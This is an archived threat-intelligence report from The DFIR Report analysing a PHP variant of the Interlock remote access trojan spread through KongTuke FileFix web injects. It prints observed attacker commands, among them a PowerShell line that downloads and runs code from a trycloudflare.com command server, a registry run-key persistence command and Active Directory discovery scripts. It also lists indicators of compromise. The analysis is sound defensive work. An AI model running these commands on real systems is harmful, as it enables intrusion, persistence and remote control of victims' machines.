---
title: "KongTuke FileFix Leads to New Interlock RAT Variant - The DFIR Report"
source_url: "https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/"
published: "2025-07-14T00:50:41+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2025-07-14_kongtuke-filefix-leads-to-new-interlock-rat-variant.html"
---

# KongTuke FileFix Leads to New Interlock RAT Variant - The DFIR Report
Researchers from The DFIR Report, in partnership with Proofpoint, have identified a new and resilient variant of the Interlock ransomware group’s remote access trojan (RAT). This new malware, a shift from the previously identified JavaScript-based Interlock RAT (aka NodeSnake ), uses PHP and is being used in a widespread campaign.

Since May 2025, activity related to the Interlock RAT has been observed in connection with the LandUpdate808 (aka KongTuke) web-inject threat clusters. The campaign begins with compromised websites injected with a single-line script hidden in the page’s HTML, often unbeknownst to site owners or visitors.

The linked JavaScript employs heavy IP filtering to serve the payload, which first prompts the user to click a captcha to “Verify you are human” followed by “Verification steps” to open a run command and paste in from the clipboard. If pasted into the run command it will execute a PowerShell script which eventually leads to Interlock RAT.

Proofpoint researchers have observed both Interlock RAT Node.js and Interlock RAT PHP based variants. The Interlock RAT PHP based variant was first spotted in June 2025 campaigns.

The DFIR Report researchers have recently seen this same KongTuke web-inject transitioning to a FileFix variant.

This updated delivery mechanism has been observed deploying the PHP variant of the Interlock RAT, which in certain cases has then led to the deployment of the Node.js variant of the Interlock RAT. We’ll be discussing the PHP variant throughout the remainder of the report.

### Noteworthy Tradecraft & Techniques:

- Execution : We observed the initial execution of the Interlock RAT using the below command. This command reflects PowerShell spawning PHP with suspicious arguments, particularly the loading of the config file from a non-standard location. The PHP executable located in the user’s AppData\Roaming directory is invoked with directives to enable the ZIP extension, and a config (.cfg) file is passed as input. We created a PowerShell and Python script to parse the config which can be found here .
"powershell.exe" -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\") | iex" └── "C:\Users\REDACTED\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\\AppData\Roaming\php\wefs.cfg 1
- Automated Discovery: Upon execution, the Interlock RAT immediately performs automated reconnaissance of the compromised system. It uses a series of PowerShell commands to gather and exfiltrate a comprehensive system profile as JSON data. The collected information includes detailed system specifications (systeminfo), a list of all running processes and associated services (tasklist), running Windows services (Get-Service), all mounted drives (Get-PSDrive), and the local network neighborhood via the ARP table (Get-NetNeighbor). The malware also checks its own privilege level to determine if it is running as USER, ADMIN, or SYSTEM, allowing the threat actor to instantly understand the context of the compromise.
"C:\Users\REDACTED\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\\AppData\Roaming\php\wefs.cfg 1 └── cmd.exe /s /c "powershell -c Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Permanent' } | Select-Object @{Name='Interface'; Expression={$_.InterfaceAlias}}, @{Name='Internet Address'; Expression={$_.IPAddress}}, @{Name='Physical Address'; Expression={$_.LinkLayerAddress}}, @{Name='Type'; Expression={'dynamic'}} | ConvertTo-Json" └── cmd.exe /s /c "powershell -c "systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json"" └── cmd.exe /s /c "powershell -c "if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -match '(?i)SYSTEM') { 'SYSTEM' } elseif (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'ADMIN' } else { 'USER' } "" └── cmd.exe /s /c "powershell -c "tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json"" └── cmd.exe /s /c "powershell -c "Get-Service | Select-Object -Property Name, DisplayName | ConvertTo-Json"" └── cmd.exe /s /c "powershell -c "Get-PSDrive -PSProvider FileSystem | ConvertTo-Json""
- Hands on Keyboard Discovery : The execution chain shows strong evidence of an interactive session. Some of the notable discovery commands we observed from the Interlock RAT includes the following:
"C:\Users\REDACTED\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\\AppData\Roaming\php\wefs.cfg 1 └── cmd.exe /s /c "powershell -WindowStyle Hidden -Command "echo AD_Computers: ([adsiSearcher]\"(ObjectClass=computer)\").FindAll().count"" └── cmd.exe /s /c "powershell -Command "$searcher = [adsisearcher]'(&(objectCategory=user)(description=*))'; $searcher.PropertiesToLoad.Add('samaccountname'); $searcher.PropertiesToLoad.Add('description'); $results = $searcher.FindAll(); foreach ($result in $results) { $result.Properties['samaccountname'][0] + ' - ' + $result.Properties['description'][0] }"" └── cmd.exe /s /c "net user %%USERNAME%% /domain" └── cmd.exe /s /c "powershell -Command "$searcher = New-Object DirectoryServices.DirectorySearcher '(&(objectCategory=computer))'; $searcher.PropertiesToLoad.Add('name') | Out-Null; $searcher.PropertiesToLoad.Add('description') | Out-Null; $results = $searcher.FindAll(); foreach ($result in $results) { $computerName = $result.Properties['name'][0]; if ($computerName -match '(?i)VB|VBR|VEEA|VEEAM|BCK|BACK') { $desc = $result.Properties['description']; if ($desc -and $desc[0]) { Write-Output \"${computerName} - $($desc[0])\" } else { Write-Output \"$computerName\" } } }"" └── cmd.exe /s /c "tasklist" └── cmd.exe /s /c "nltest /dclist:" └── cmd.exe /s /c "whoami" └── cmd.exe /s /c "dir %%appdata%%"
- Command and Control : The Interlock RAT establishes a robust command and control (C2) channel with the attackers’ infrastructure. Notably, it leverages trycloudflare.com URLs, abusing the legitimate Cloudflare Tunnel service to mask the true location of the C2 server. To enhance resilience, the malware also contains hardcoded fallback IP addresses, ensuring communication can be maintained even if the Cloudflare Tunnel is disrupted.

- Command and Control Execution Capabilities : Based on the command code received, the script takes one of several actions:
EXE Command: It downloads a Windows executable file (.exe), saves it to a temporary folder, and runs it. DLL Command: It downloads a dynamic-link library (.dll) and executes it using the Windows tool rundll32.exe. AUTORUN Command: It sets itself up for persistence. The script adds an entry to the Windows Registry's "Run" key. CMD Command: It executes any shell command the attacker sends, giving them a remote command prompt on the victim's machine. OFF Command: It shuts itself down.
- Persistence : After the Interlock RAT was executed, it created a run key with various values:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "REDACTED" /t REG_SZ /d ""C:\Users\REDACTED\AppData\Roaming\php\php.exe" "C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg"" /f
- Lateral Movement : RDP was used to move throughout victim environments.
Targeting : The campaign appears to be opportunistic, targeting a broad range of industries.

This discovery highlights the continued evolution of the Interlock group’s tooling and their operational sophistication. While the Node.js variant of Interlock RAT was known for its use of Node.js, this variant leverages PHP, a common web scripting language, to gain and maintain access to victim networks.

We’re continuing to monitor this threat actor closely. Additional insights from our investigation will be shared soon. Make sure to follow us on social media to stay informed as we publish further activity.

We’d like to thank our friends at Proofpoint for working together on this report!

Existing All Intel customers can access additional information, Sigma and YARA rules and IOCs here .

Not a Customer Yet?
We’d love to connect and discuss how our services can support and strengthen your organization’s security posture.

Whether you’re interested in Sigma or YARA rules, or gaining access to our exclusive private reports, our team is here to help.

📩 Reach out to us today to explore how we can work together.

### IOCs
Configs Name: config.cfg | File Size: 27392 Byte(s) SHA256: 28a9982cf2b4fc53a1545b6ed0d0c1788ca9369a847750f5652ffa0ca7f7b7d3 Name: config.cfg | File Size: 28268 Byte(s) SHA256: 8afd6c0636c5d70ac0622396268786190a428635e9cf28ab23add939377727b0 Interlock RAT PHP Variant domains and fallback IPs existed-bunch-balance-councils[.]trycloudflare[.]com ferrari-rolling-facilities-lounge[.]trycloudflare[.]com galleries-physicians-psp-wv[.]trycloudflare[.]com evidence-deleted-procedure-bringing[.]trycloudflare[.]com nowhere-locked-manor-hs[.]trycloudflare[.]com ranked-accordingly-ab-hired[.]trycloudflare[.]com 64[.]95[.]12[.]71 184[.]95[.]51[.]165

##### Share this entry

- Share on Facebook

- Share on X

- Share on WhatsApp

- Share on Linkedin

- Share on Reddit

- Share by Mail
